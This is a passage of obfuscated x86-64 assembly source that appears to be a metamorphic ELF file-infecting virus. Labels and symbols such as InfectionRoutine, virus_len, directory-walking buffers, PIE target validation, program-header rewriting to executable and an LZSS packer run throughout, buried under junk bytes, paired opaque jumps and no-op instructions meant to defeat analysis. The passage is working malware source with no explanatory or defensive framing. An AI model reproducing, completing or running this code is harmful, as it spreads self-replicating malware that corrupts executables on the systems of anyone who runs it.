db 0xff
    js          ..@V73ut60foRNf
    jns         ..@V73ut60foRNf
..@6yGoyZOiUXB6:
    pop         rsi
    jmp         $+4
db 0x40, 0x90
    jmp         $+5
db 0x1f, 0x53, 0x1c
    js          ..@puToC7Uupj12
    jns         ..@puToC7Uupj12
..@Ndq4hJaaWiKU:
    xchg        rsi, rsi
    jmp         ..@1BdoHp1WvPgX
..@Yqyks4wmjocc:
    mov         rbp, rbp
    je          ..@7RQhosmNxeuH
    jne         ..@7RQhosmNxeuH
..@EIDMn43X5C04:
    jz          ..@MECDYMGUR8cO
    jmp         $+5
db 0x10, 0xa1, 0x20
    jmp         ..@qvJZftpSxxmX
..@f7tIFmabkVx6:
    push        r1
    jmp         ..@rUaoFe7tly9z
..@EjnOtIVLXz7J:
    push        rax
    jmp         $+5
db 0x32, 0x94, 0xcb
    jmp         ..@0cTynF6sdH7z
..@J6z1q16AJI7C:
    push        0x00
    jmp         $+5
db 0x9c, 0xf8, 0xfc
    jmp         $+3
db 0x75
    js          ..@FpKd1qu1QhlZ
    jns         ..@FpKd1qu1QhlZ
..@dkafykTi7Drq:
%ifdef X86_64
    pop         rcx
%endif
    jmp         ..@Sb6UQsj8U1G3
..@t95sR3uetWoF:
    mov         rsp, rsp
    jb          ..@ze6X52RRnMOr
    jae         ..@ze6X52RRnMOr
..@cxknVUPxvz7K:
    rep         nop
    jmp         $+4
db 0x25, 0x62
    jl          ..@aRVxNZPkH5um
    jge         ..@aRVxNZPkH5um
..@CgtQ7ItJR7jm:
    cmp         r2d, '../'
    jl          ..@jjNovgAOSPxg
    jge         ..@jjNovgAOSPxg
..@AaYIWdjOSMuu:
    sub         rsp, _UPDATASIG_OFF_size
    jmp         $+3
db 0x31
    jmp         $+3
db 0x45
    jmp         $+5
db 0x98, 0x80, 0x19
    jl          ..@fh16ynzJIioV
    jge         ..@fh16ynzJIioV
..@tIyb22wzmakk:
    xor         r2, r2
    jmp         $+5
db 0x7b, 0x18, 0xd2
    jmp         $+5
db 0xf3, 0x49, 0x5e
    jmp         ..@kb8eQfaKDWFX
..@FIHHdpNVP0mD:
    xor         rax, rax
    jmp         $+4
db 0x10, 0x42
    jmp         ..@ldeyaI5nbK4C
..@wX6mCry1vZ23:
    add         rax, p_h.p_type
    js          ..@sOLUQzAS4cwG
    jns         ..@sOLUQzAS4cwG
..@9FoRuTciFEp1:
    jl          ..@pYrADYj24mlU
    jmp         $+4
db 0x74, 0x2f
    je          ..@8KsvdorhYO52
    jne         ..@8KsvdorhYO52
..@xnkWZN5OwvzW:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+5
db 0xf5, 0x3e, 0x4d
    jmp         ..@SeM4N2c2uRZM
..@ZVAHtMa8VWmF:
    push        rcx
    js          ..@CaFaqR3PpJ7s
    jns         ..@CaFaqR3PpJ7s
..@49CBUcSv2x6r:
    xor         rax, rax
    jl          ..@X40UJXB2efda
    jge         ..@X40UJXB2efda
..@UCnzclZtvKQR:
    mov         rdi, rdi
    jb          ..@sPDjdKMOtIW4
    jae         ..@sPDjdKMOtIW4
..@PgjwUCnAvskZ:
    rep         nop
    jmp         $+4
db 0xd7, 0x64
    js          ..@f8BoGsrEvq8o
    jns         ..@f8BoGsrEvq8o
..@F5TG6QkXSYhM:
    jl          ..@91XzPbK6eYnl
    jmp         $+4
db 0xec, 0xa2
    jmp         ..@Tb4XBR9q1E1u
..@79FTwrNlB4mw:
    pop         rdi
    jmp         ..@ucNgKaIMXCla
..@pF0TvrBupU4P:
    sub         r4, m6
    jmp         $+5
db 0x57, 0xd0, 0x61
    jb          ..@P8a8qprX13kR
    jae         ..@P8a8qprX13kR
..@QMzzMV9TqKA5:
    xor         rax, rax
    jmp         $+5
db 0x06, 0x94, 0x20
    jmp         ..@y5sAyjLu36I3
..@Z5Z5Lwo4aJdr:
    pop         rax
    js          ..@HuWmjb6uzHy4
    jns         ..@HuWmjb6uzHy4
..@8qdnbeZkXNAX:
    cmp         rax, 0x00
    jmp         ..@dSIip1DaP31E
..@Iqu5gxM2bBgm:
    xchg        rdi, rdi
    jmp         $+5
db 0x72, 0x8e, 0x3a
    js          ..@NEOLRWUQm0Qh
    jns         ..@NEOLRWUQm0Qh
..@mSXJQdtv59IT:
    add         rdi, virus_len-_start
    js          ..@Rdl3DdTSiFRk
    jns         ..@Rdl3DdTSiFRk
..@H1lvKt5U4OuQ:
    add         r1, non_packed_len+PADDING
    jl          ..@ou2ZSsuTnuPB
    jge         ..@ou2ZSsuTnuPB
..@IKJZeG1th99q:
    push        r5
    jmp         $+3
db 0x9c
    jl          ..@b8Wyqe4kSU0v
    jge         ..@b8Wyqe4kSU0v
..@QQSxhA2XeV0c:
    pop         rdx
    jmp         ..@jbIVqxuLg3Sj
..@PRWTt02KjlPp:
    pop         rcx
    js          ..@Pb2MryJdwAY8
    jns         ..@Pb2MryJdwAY8
..@bbePXKXkCRMp:
    mov         QWORD [r2+p_h.p_paddr], r3
    jmp         $+3
db 0xd5
    js          ..@BB5ZktimiPIJ
    jns         ..@BB5ZktimiPIJ
..@91XzPbK6eYnl:
    add         rsp, _PROC_OFF_size
    jb          InfectionRoutine
    jae         InfectionRoutine
..@w5l8UJ1y16Uy:
    mov         rcx, rcx
    js          ..@bOnZaDguVlzm
    jns         ..@bOnZaDguVlzm
..@w0HbAGyxBalc:
    push        rsi
    jmp         $+5
db 0x93, 0x00, 0xde
    jb          ..@SRbAObJDNy4S
    jae         ..@SRbAObJDNy4S
..@XE5THHHRKTLd:
    call        WORDToDWORDASCII
    jmp         ..@w1SDMSglxPq4
..@gmuPnC6r2UBs:
    test        edx, edx
    jmp         $+4
db 0x99, 0x5e
    jl          ..@RN00HzaZSIrX
    jge         ..@RN00HzaZSIrX
..@njeNmYuXT6vw:
    mov         r1, r4
    js          ..@xkdxBuA6NXd6
    jns         ..@xkdxBuA6NXd6
..@Dsc9LVstYRyt:
    xor         r1, r1
    jmp         $+5
db 0xd2, 0xc0, 0xce
    jmp         $+3
db 0x6b
    jb          ..@Olxw4ZoLTI5C
    jae         ..@Olxw4ZoLTI5C
..@cN0A7p0InKfs:
    xor         rdx, rdx
    jl          ..@ACzNTp75A5DF
    jge         ..@ACzNTp75A5DF
..@zsNt1sVTvfPe:
    pop         rdi
    jmp         ..@9pRpqzliZARW
..@T1hu9ISrw1wD:
    add         rdi, rbx
    jmp         ..@em0ye9VXltO8
..@824wRRbOEblh:
    pop         rdi
    jmp         $+3
db 0xd8
    jmp         ..@Br1Arj2G8xLl
..@SFToo3VAyCoA:
    pop         rax
    jmp         ..@5QCHL9VYS9cC
..@aN6wGKYJjWQc:
    cmp         rax, 0x01
    jmp         $+3
db 0xac
    jb          ..@os1YyASpfoax
    jae         ..@os1YyASpfoax
..@2LPaJrWgwFpW:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+5
db 0x29, 0x33, 0x82
    js          ..@fH1aOQWbmeVm
    jns         ..@fH1aOQWbmeVm
..@V6rQQHpGf2yI:
    cmp         rax, (-1)
    jmp         $+5
db 0x1a, 0x05, 0xb2
    je          ..@LKgCdDHjQVaW
    jne         ..@LKgCdDHjQVaW
..@oAFyjyfMyB7j:
    push        rdi
    jmp         $+4
db 0xa8, 0x8a
    je          ..@VtHDMBr9WVYK
    jne         ..@VtHDMBr9WVYK
..@vLs8HC8MSUD8:
    sub         rsp, _DYNPIE_OFF_size
    jmp         ..@7POBsMdV627i
..@i0yMqb0hozXL:
    push        rbx
    jmp         $+3
db 0xfd
    jmp         $+4
db 0x7a, 0x4c
    jmp         ..@Jnjjgvm4Z8eK
..@ekkbhmqL1hgB:
    push        r1
    jmp         $+3
db 0x9c
    jmp         ..@sBael5cpc75U
..@u6kJtkiUL4D1:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x8e, 0x95, 0x64
    jmp         $+5
db 0x68, 0xb2, 0x99
    js          ..@2PskbiImP3i8
    jns         ..@2PskbiImP3i8
..@DyKO7j6f8hY4:
    jne         ..@cN0A7p0InKfs
    jl          ..@9ZiS6ICJFIqk
    jge         ..@9ZiS6ICJFIqk
..@dz9ONzXzcK4G:
    pop         rdx
    js          ..@p7I4Ms2ae8vI
    jns         ..@p7I4Ms2ae8vI
..@newxpJKxin40:
    xchg        rbx, rbx
    jmp         ..@qfclJm5edklh
..@zEN3QjHBp9a1:
    xor         r2, r2
    jmp         $+4
db 0x96, 0x24
    jb          ..@UABSdhfVU67e
    jae         ..@UABSdhfVU67e
..@SeM4N2c2uRZM:
    xchg        rcx, rcx
    jmp         $+3
db 0x2a
    je          ..@P64o9k76Yrc5
    jne         ..@P64o9k76Yrc5
..@yBw2zMctgQzQ:
    cld
    jb          ..@JgHtdy0sBHI9
    jae         ..@JgHtdy0sBHI9
..@sT37yvhqgqgW:
    mov         rdi, QWORD [r5+file.fileptr]
    jmp         ..@G7fXkRYBDQzP
..@3vFP8mbsyDqy:
    push        rdi
    jmp         $+5
db 0xfd, 0x95, 0x2e
    jl          ..@boQG2H8Su9K9
    jge         ..@boQG2H8Su9K9
..@wgPTwBxetdP2:
    pop         rax
    jmp         $+3
db 0x44
    jmp         $+4
db 0x92, 0x1b
    js          ..@7OOrZPBhYX7T
    jns         ..@7OOrZPBhYX7T
..@wpA1jlaTmoel:
    xchg        rcx, rcx
    js          ..@dFt3IEIlhPRp
    jns         ..@dFt3IEIlhPRp
..@cdOlhyErjEpY:
    add         r1, 1
    jmp         $+3
db 0xba
    js          ..@BhnwjmheJ58l
    jns         ..@BhnwjmheJ58l
..@hz6aX6bNUxrt:
    jne         ..@wFxocBU2YaRp
    jmp         ..@wzLybGCQ7LIU
..@L6BHuCi8gJEa:
    xchg        rbx, rbx
    jb          ..@eKtTQ38OWGQP
    jae         ..@eKtTQ38OWGQP
..@E8mcsleMiRJz:
    mov         rax, (-1)
    js          ..@D464T8miEWI6
    jns         ..@D464T8miEWI6
..@Z8MM26fI784i:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jl          ..@8sMG7Y2ScoSH
    jge         ..@8sMG7Y2ScoSH
..@yPgWUaDs7jII:
    pop         rsi
    jmp         $+4
db 0x9f, 0xa2
    jmp         ..@6e7AAlHYy3iz
..@mOdmqmcFAdFR:
    jmp         ..@cp135qaMwlmB
    jmp         $+3
db 0xc9
    jmp         ..@cp135qaMwlmB
..@ou2ZSsuTnuPB:
    mov         r3, r1
    jmp         $+4
db 0x12, 0x0d
    jmp         $+3
db 0xe4
    jmp         ..@grbqeN6tNrpf
..@Ln82MNbWpNIc:
    ret
    jmp         ..@c3Famlbx1rX9
..@kqVyUjMNLbDz:
    push        rdx
    jmp         $+5
db 0x09, 0xe7, 0xc4
    js          ..@iHFdJT9UBBPj
    jns         ..@iHFdJT9UBBPj
..@tZGEZ0kALynf:
    xchg        rdi, rdi
    jmp         ..@sldrqSwttuu6
..@kPSL7B3urxZl:
    xchg        rcx, rcx
    jmp         $+5
db 0x30, 0xbc, 0x33
    jmp         $+5
db 0x7d, 0x66, 0xf3
    jmp         $+4
db 0xed, 0xb2
    jmp         $+3
db 0xcb
    jmp         ..@N1TRN5K529Sm
..@cN3io4Sh9Tg9:
    pop         rdi
    jb          ..@ELOr7ktX3Uol
    jae         ..@ELOr7ktX3Uol
..@vQE8yLnreirj:
    mov         rsp, rsp
    jmp         $+3
db 0x13
    jb          ..@10JAaw3DjiEl
    jae         ..@10JAaw3DjiEl
..@mG7zlKUGJc9g:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+3
db 0x7f
    jmp         $+3
db 0x1b
    jmp         $+4
db 0xec, 0xa4
    jmp         $+4
db 0x0e, 0xb8
    jl          ..@QgwUEmYmYc4s
    jge         ..@QgwUEmYmYc4s
..@aRVxNZPkH5um:
    je          ..@b57s9zdrznFN
    js          ..@k1ANO8803roZ
    jns         ..@k1ANO8803roZ
..@HY1fwXfJ3Xot:
    pop         rdx
    jb          ..@dTKVhSleMOYy
    jae         ..@dTKVhSleMOYy
..@Uf1fQv4N3GAo:
%ifdef X86_64
    push        rsi
%endif
    jmp         $+4
db 0x19, 0x85
    jmp         ..@lNl9lHkF4roF
..@yNHYpfFMjyuz:
    add         m7, rax
    jmp         $+3
db 0x0f
    jl          ..@vKj647QWZy6a
    jge         ..@vKj647QWZy6a
..@JUEP3gNe55yH:
    mov         eax, ebx
    jb          ..@RrLjqDC7gPWj
    jae         ..@RrLjqDC7gPWj
..@MI0aoIe4C52V:
    ret
    jb          ..@oxZwphW9L8ye
    jae         ..@oxZwphW9L8ye
..@TxZjXiXyzd4c:
    mov         r1, QWORD [r5+file.filename]
    jb          ..@3y0dkXaDV7v0
    jae         ..@3y0dkXaDV7v0
DYNPIEValidation:
    jmp         ..@3OCxNwwOUrXD
..@SU1RcjBoVQ5R:
    jg          ..@8NCjFeuoEttB
    jmp         ..@dNBm0VYTekug
..@tAXrk7vltk9i:
    xor         rax, rax
    jmp         ..@X5OlYqEgQaYv
..@bFJLnPKEjdc0:
    mov         r1, r5
    jl          ..@7Fl5OZar8Xtf
    jge         ..@7Fl5OZar8Xtf
..@NuHQ7moaL0yY:
    mov         r3, original_virus_len-non_packed_len
    jmp         $+3
db 0x77
    jb          ..@kFldMyYgBlei
    jae         ..@kFldMyYgBlei
..@qpWOX1DBeRy9:
    add         rax, 4
    jmp         $+5
db 0x7d, 0x4f, 0x0e
    jmp         $+4
db 0x58, 0xd7
    je          ..@5I5l0W1w9EvX
    jne         ..@5I5l0W1w9EvX
..@JLGePTdQqW8R:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jl          ..@COBZQuhDGPIh
    jge         ..@COBZQuhDGPIh
..@vfR6lKSIiSdw:
    push        rdi
    jb          ..@24LgffKTHnML
    jae         ..@24LgffKTHnML
..@p3AJcvpIqcvG:
    mov         rsp, rsp
    jb          ..@EIDMn43X5C04
    jae         ..@EIDMn43X5C04
..@V50oqY6K8hN1:
    pop         rbx
    jmp         $+5
db 0x17, 0xba, 0x5a
    jmp         ..@PY4zoGcW3FDe
..@o9hfY4FXXJuX:
    pop         rcx
    jmp         $+3
db 0xee
    jmp         ..@yZ13OWDX30xT
..@whJriTWpBNlq:
    call        AddSizeMappedFile
    jmp         ..@71VYU2GWb36m
..@kX2sbOslCZRL:
    xchg        rsp, rsp
    jmp         $+5
db 0x40, 0xd3, 0x37
    jmp         $+4
db 0x18, 0x6e
    jb          ..@GzFYnYZQQtnJ
    jae         ..@GzFYnYZQQtnJ
..@Hl2sYF7k1Ydz:
    xor         rax, rax
    jmp         ..@mfIj63RkyEEQ
..@kr7zRQgMfPKO:
    cmp         eax, 0x3
    jb          ..@gCZsUmWqhn1o
    jae         ..@gCZsUmWqhn1o
..@ZRJks6IMjCoo:
    lea         r1, [rsp+_PROC_OFF.buffer]
    je          ..@SJgcE55lUPVK
    jne         ..@SJgcE55lUPVK
..@TcdH6yiT8dao:
    je          ..@CcixghylXLa7
    jl          ..@eZI7Lgisg2Ee
    jge         ..@eZI7Lgisg2Ee
..@nQHiL0x1boyD:
    push        rdi
    jb          ..@FsKdCvsGsPAE
    jae         ..@FsKdCvsGsPAE
..@XrrNJt69BW35:
    add         rdi, rax
    jl          ..@NHBtB3FUAldN
    jge         ..@NHBtB3FUAldN
..@qfclJm5edklh:
    push        rdi
    jmp         $+4
db 0xf2, 0xd6
    js          ..@ngwfwRSh6Oet
    jns         ..@ngwfwRSh6Oet
..@XhazY5AyDzq2:
    push        r4
    jmp         $+4
db 0x66, 0x5e
    jl          ..@Xt9NKIJjoJtc
    jge         ..@Xt9NKIJjoJtc
..@KPwGTYdbJXMu:
    sub         dl, cl
    jmp         $+4
db 0xeb, 0x3d
    jb          ..@SlfZBn7P1ilM
    jae         ..@SlfZBn7P1ilM
..@j0Tr7Ou9PnQn:
    cmp         eax, 0x00
    jmp         ..@YPMitm4q5Jps
..@foVNd5ZSVVf6:
    cmp         rax, 0x00
    js          ..@HPF4FIpg7AiG
    jns         ..@HPF4FIpg7AiG
..@sm75lir6gCKJ:
    jmp         ..@jXJpeEqjAuBw
    jmp         ..@V3SFRo7W87v3
..@uTa3i1S44PNn:
    OFILE       QWORD [r2], 0x02
    jmp         $+3
db 0x7b
    jmp         ..@fABKfm2fG3SN
..@ZF1IErr9XlhH:
    xchg        rsp, rsp
    jmp         $+4
db 0xc0, 0x41
    js          ..@6zGB840omvPm
    jns         ..@6zGB840omvPm
..@M68blAzsHUdj:
%ifdef X86_64
    xor         r10, r10
%endif
    jmp         ..@G2QyQXGsAnDm
..@Jnjjgvm4Z8eK:
    pop         rbx
    jl          ..@T5GXAs4qt0Aj
    jge         ..@T5GXAs4qt0Aj
..@S78qN5LYiHRk:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jmp         $+5
db 0x05, 0xda, 0xad
    js          ..@Ng5MKFQ2cssM
    jns         ..@Ng5MKFQ2cssM
..@xwdLr58YcPME:
    or          edi, eax
    jb          ..@cCxm56iRzE0j
    jae         ..@cCxm56iRzE0j
..@K3mxLhSwvSGy:
    add         rsp, _LZSSE_OFF_size
    jmp         $+5
db 0x2f, 0x4f, 0x62
    jmp         ..@jXE7eY7pRZX1
..@iHFdJT9UBBPj:
    pop         rdx
    jmp         ..@aRbsvU3eIWck
..@hBk8yflc7xLc:
    pop         rcx
    jmp         $+4
db 0x5d, 0x3c
    js          ..@z7EMNV8fsudB
    jns         ..@z7EMNV8fsudB
..@qTC8zGvv4kZE:
    push        rsi
    jmp         $+5
db 0x30, 0x05, 0x07
    jmp         $+5
db 0xfe, 0xa8, 0x60
    jl          ..@RjLzjJ9BsEJR
    jge         ..@RjLzjJ9BsEJR
..@jzKCVvzhoxpz:
%ifdef X86_64
    pop         rcx
%endif
    jmp         $+4
db 0x56, 0xef
    jl          ..@ok8lQ8Pr7kj8
    jge         ..@ok8lQ8Pr7kj8
..@7vUsilhskqvl:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+5
db 0x50, 0xd3, 0x1a
    jmp         $+3
db 0x25
    jmp         ..@e6OarU1PfXa8
..@ssMj1G6HLnRx:
%ifdef X86_32
    pop         ebp
%endif
    jb          ..@ZrVTPwsvo1H5
    jae         ..@ZrVTPwsvo1H5
..@TIcwmgzRqkXo:
    pop         r5
    jmp         $+4
db 0x4c, 0x99
    jmp         ..@lfpcXRl0jLuV
..@eEjUirwuD7Td:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    jmp         ..@z8rDV7vmEutt
..@Tjk58gEDzHyx:
    push        rcx
    js          ..@PRWTt02KjlPp
    jns         ..@PRWTt02KjlPp
..@0k8cZrhOC1wG:
    xchg        rsi, rsi
    jmp         $+3
db 0x67
    jl          ..@d3WYlvIExPLp
    jge         ..@d3WYlvIExPLp
..@UABSdhfVU67e:
    push        rsi
    jb          ..@0I1ybR1YfOc6
    jae         ..@0I1ybR1YfOc6
..@RdYNeecj6YHX:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         $+5
db 0x15, 0x3d, 0x06
    jl          ..@M68blAzsHUdj
    jge         ..@M68blAzsHUdj
..@9pRpqzliZARW:
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    jb          ..@EiJAQr7PjSIk
    jae         ..@EiJAQr7PjSIk
..@6XOpzqJiqkYv:
    mov         rax, rax
    jmp         $+4
db 0x4d, 0x29
    jmp         $+4
db 0x43, 0x46
    jl          ..@8S3WDTHlsdUj
    jge         ..@8S3WDTHlsdUj
..@9tjpJLjLN4z2:
    je          ..@kvxyBBVN23xy
    jmp         $+5
db 0xdc, 0xe9, 0x10
    js          ..@kHTz2qKa33UU
    jns         ..@kHTz2qKa33UU
..@9dhWxsDOTGAG:
    push        rcx
    jmp         $+4
db 0x80, 0xa0
    jb          ..@GoPNYFh2ZI3a
    jae         ..@GoPNYFh2ZI3a
..@il5adnQe89h5:
    add         r4, 1
    jmp         $+3
db 0x0b
    js          ..@y51wtZy3xDzT
    jns         ..@y51wtZy3xDzT
..@FbGigBiVeeJg:
    push        rcx
    jmp         ..@dh0zqcCNCSIZ
..@G6OAeSBvzGtX:
    pop         rcx
    jmp         ..@Ndq4hJaaWiKU
..@fvdL2ky5f2aB:
    mov         eax, 0x00
    jb          ..@ZJWfNyMXD0sJ
    jae         ..@ZJWfNyMXD0sJ
..@Tb4XBR9q1E1u:
    xchg        rbx, rbx
    jmp         $+5
db 0xf5, 0x17, 0x22
    js          ..@GilpRelghEwl
    jns         ..@GilpRelghEwl
..@AS6w2oLJkPEI:
    xchg        rdx, rdx
    jmp         $+5
db 0x5a, 0x4a, 0x7f
    jmp         ..@bOGi5QhGqlAr
..@XfAwFv0iBBw3:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    js          ..@KDPI86zipRCy
    jns         ..@KDPI86zipRCy
..@Vv6Xwbm8aKMc:
    push        rcx
    jl          ..@sVjYmmF2us71
    jge         ..@sVjYmmF2us71
..@dfMxUwyZkyxr:
%ifdef X86_32
    xchg        rdi, rdi
%endif
    jmp         ..@0radqNqaOIv1
..@YRKXbaHBxVRk:
    mov         rax, 1
    jmp         $+4
db 0xcf, 0x64
    jmp         ..@mK1LNeSeIZ9q
..@RJ67dfH94Zgf:
    xchg        rsi, rsi
    jmp         $+4
db 0xe2, 0x39
    jmp         $+4
db 0xf1, 0x10
    je          ..@Ayq5RIpEaoXx
    jne         ..@Ayq5RIpEaoXx
..@k8pUh766ZAP8:
    call_vsp    ExitProgram
    jmp         ..@uFfkLHi4ZgFg
..@S5VPUgBpqz4E:
    pop         rcx
    jmp         $+5
db 0x07, 0x49, 0xe9
    je          ..@b4GB4zIWLWqZ
    jne         ..@b4GB4zIWLWqZ
..@6oFdptGBW2wE:
    pop         rax
    jl          ..@3tw1PGwPeSiC
    jge         ..@3tw1PGwPeSiC
..@okTvbtkb21R5:
    pop         rsi
    js          ..@bG6G8XrKWJeJ
    jns         ..@bG6G8XrKWJeJ
..@8Pyyv94txOVr:
    xchg        rdi, rdi
    jmp         $+3
db 0x97
    jmp         $+5
db 0xb3, 0xc6, 0x55
    js          ..@NOFAwEDVhtVT
    jns         ..@NOFAwEDVhtVT
..@UkNUNiE62tgA:
    push        rcx
    js          ..@twKhG7Igiesg
    jns         ..@twKhG7Igiesg
..@hPWjEQvvsRGT:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         ..@sR8LyWSdyFs4
..@VyrcE1uvFrIT:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    jmp         $+3
db 0xf3
    jmp         ..@gP37al15isfu
..@HgDrtAhhiO8F:
    pop         rcx
    jmp         $+4
db 0xb6, 0x00
    jmp         $+3
db 0x66
    jmp         $+5
db 0x03, 0x72, 0x27
    jmp         $+3
db 0x08
    js          ..@hVLQHwBJEYhU
    jns         ..@hVLQHwBJEYhU
..@SdJlxDwjmIYR:
    mov         rdi, rdi
    jmp         $+4
db 0xb2, 0xd0
    jmp         ..@IWcCqUsTgWmd
..@XPelEnNSvpJA:
    cmp         rax, 0x02
    jb          ..@qFqSZqmgNtEc
    jae         ..@qFqSZqmgNtEc
..@ZmlIRFmLMvHc:
    sub         rsp, _NBF_OFF_size
    jl          ..@WmQgT3p0paIG
    jge         ..@WmQgT3p0paIG
..@JaEHkaQuIusx:
    pop         rdi
    jmp         ..@TIEfrZtgXmBP
LzssEncoder:
    jmp         ..@Lr5HFr6R1IGX
..@7jtyhlFhTVXk:
    mov         r1, [rsp+_NBF_OFF.file]
    jmp         $+4
db 0x37, 0x54
    jmp         ..@2amaBz2cvyu5
..@bUwFrVyDGaKr:
    add         rax, r2
    jmp         ..@OwqKZhT7JjNH
..@Ayq5RIpEaoXx:
    ret
    jl          ..@TxZjXiXyzd4c
    jge         ..@TxZjXiXyzd4c
..@F5BGh4u7Ot4j:
    mov         rbp, rbp
    jb          ..@MECDYMGUR8cO
    jae         ..@MECDYMGUR8cO
..@YYWqso4XJMJE:
    mov         r3, r2
    jb          ..@LD8Zc9f3kRsY
    jae         ..@LD8Zc9f3kRsY
..@hEkErqvai97d:
    push        rdi
    jmp         $+5
db 0x41, 0xfe, 0x46
    jmp         $+3
db 0x57
    jmp         $+3
db 0x24
    jmp         ..@2v6VYXlL54Uj
..@ngwfwRSh6Oet:
    pop         rdi
    jmp         $+3
db 0x42
    jmp         $+3
db 0xc0
    jmp         ..@hypNktNaX0Ko
..@ZAd0SDl2Vd9P:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    js          ..@fy3Cn4DaBUR9
    jns         ..@fy3Cn4DaBUR9
..@3ag1JUeF7uaZ:
    push        rbx
    jmp         $+5
db 0x54, 0x61, 0x53
    jmp         $+5
db 0xa8, 0xa2, 0x4b
    jmp         ..@l1GD1rbAR5KF
..@ExdEKAxPrJMX:
%ifdef X86_64
    mov         rsi, rsi
%endif
    jmp         ..@nVvN4aP0FWGl
..@AJoqpZRDeJ1D:
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    jmp         $+4
db 0xfa, 0xba
    jmp         ..@WQEI7032jVii
..@LBFGnowmKwKY:
    pop         rsi
    jmp         $+4
db 0x9e, 0x68
    je          ..@Ma8u04jb0lFH
    jne         ..@Ma8u04jb0lFH
..@GXwU1IoehSRU:
    pop         rdi
    jmp         $+5
db 0x66, 0x63, 0x91
    jmp         $+4
db 0x13, 0x08
    jb          ..@vHiHDq8FziSJ
    jae         ..@vHiHDq8FziSJ
..@7Y2a5QrQEWMe:
    add         rsp, _INFDIR_OFF_size
    jmp         $+5
db 0xe2, 0x0e, 0x1f
    jmp         ..@6hatZTDgzDG2
..@2Ty1EDO8Yk3l:
    rep         nop
    jl          ..@tZGEZ0kALynf
    jge         ..@tZGEZ0kALynf
..@5zXwNCW6oK1n:
    xor         rax, rax
    jmp         $+3
db 0x26
    jmp         $+4
db 0x19, 0xbf
    jb          ..@nQHiL0x1boyD
    jae         ..@nQHiL0x1boyD
..@vcG2zpjW2loF:
    test        al, al
    jb          ..@afO8R3NX2di8
    jae         ..@afO8R3NX2di8
..@6zGB840omvPm:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jmp         $+4
db 0x8f, 0x67
    je          ..@vcG2zpjW2loF
    jne         ..@vcG2zpjW2loF
..@uYOfcSaErOhB:
%ifdef X86_64
    pop         rcx
%endif
    jb          ..@nJ3mqeB2sdzA
    jae         ..@nJ3mqeB2sdzA
..@0ivUFZj4tY9m:
%ifdef X86_32
    xchg        rdx, rdx
%endif
    jmp         ..@E50ACNWZS1kA
..@rX3tNEmeS2k0:
    ret
    jmp         $+4
db 0xa5, 0xe3
    jmp         GetNewProgramVaddr
..@lEagLe1oDtlv:
%ifdef X86_64
    pop         rsi
%endif
    jmp         $+5
db 0x7a, 0x29, 0x2c
    jb          ..@c8RvyZtn8G9H
    jae         ..@c8RvyZtn8G9H
..@T268t6J3bDKC:
    xor         r3, r3
    jmp         $+3
db 0x57
    jmp         ..@0k8cZrhOC1wG
..@0KF4SrUsepv2:
    pop         rbx
    jl          ..@iffjcDN5EpUd
    jge         ..@iffjcDN5EpUd
..@0SXml9XLFrfI:
    jne         ..@r2UmSb8nTjhn
    jmp         $+4
db 0x29, 0xbd
    jl          ..@wIa3QckWU6nZ
    jge         ..@wIa3QckWU6nZ
..@kbt4aDus6ULM:
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    jmp         $+3
db 0x7b
    je          ..@OcoSxpH9Yr1c
    jne         ..@OcoSxpH9Yr1c
..@WePPqjU8CZlh:
    xchg        rsp, rsp
    jmp         $+4
db 0x72, 0x79
    js          ..@e0YnnJoYkTvd
    jns         ..@e0YnnJoYkTvd
..@m4JmVhqlCmGD:
    mov         rdx, rdx
    jb          ..@34rkUGCPVsfj
    jae         ..@34rkUGCPVsfj
..@PQlyYmm79a4K:
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@Uk4nHSfHf6fH
..@9Ibsn2SbuT7q:
    pop         rcx
    jmp         $+5
db 0x6f, 0xab, 0x44
    js          ..@cZdHMCEqgJBw
    jns         ..@cZdHMCEqgJBw
..@2ePx5yHS4MGD:
    push        rbx
    jmp         $+5
db 0x52, 0xba, 0x0e
    jmp         ..@6OHeDthQXAW6
..@NHBtB3FUAldN:
    xor         rax, rax
    jmp         ..@KQV2sXBNO2kf
..@oLgRoggII5g9:
    push        rsi
    jmp         ..@oAFyjyfMyB7j
..@YjwZcchUX1Bn:
    xchg        rdi, rdi
    jmp         ..@8STp6KTopbMP
..@RDxa26yN9PbW:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jmp         $+4
db 0x2d, 0x01
    jmp         ..@RRgAo7ZbLicb
..@RRgAo7ZbLicb:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+3
db 0x27
    js          ..@zCHA0whR9cz9
    jns         ..@zCHA0whR9cz9
..@GAUsH3wgeL0J:
    call        FileValidation
    jmp         $+5
db 0x3a, 0x1e, 0x19
    jmp         ..@7Z9aEBDO4ULM
..@n7uQEKaC0TWC:
    push        rdi
    jmp         $+5
db 0x70, 0x54, 0x3c
    jmp         $+5
db 0x5d, 0x6d, 0x93
    jmp         ..@rnReCwAMxLS5
..@Uz7IMc2tmgsD:
    mov         rsi, rsi
    jmp         $+4
db 0x19, 0x73
    jmp         $+5
db 0x3f, 0x94, 0x79
    je          ..@rdDKEMjuIm45
    jne         ..@rdDKEMjuIm45
..@rgQ99Cr6iMte:
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jl          ..@rndxgiPOunok
    jge         ..@rndxgiPOunok
..@gyqP4n9sGUMJ:
    mov         r3, rax
